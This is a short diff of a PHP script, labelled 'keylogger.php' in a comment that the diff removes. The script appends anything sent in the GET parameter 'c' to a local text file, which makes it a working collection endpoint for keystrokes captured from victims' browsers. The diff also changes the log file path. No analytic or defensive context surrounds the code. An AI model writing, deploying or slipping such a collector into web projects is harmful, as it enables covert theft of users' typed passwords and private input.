@@ -1,8 +1,6 @@
 <?php
-// keylogger.php
-
 if(!empty($_GET['c'])) {
-    $logfile = fopen('../php/data.txt', 'a+');
+    $logfile = fopen("data.txt" , 'a+');
     fwrite($logfile, $_GET['c']);
     fclose($logfile);
 }
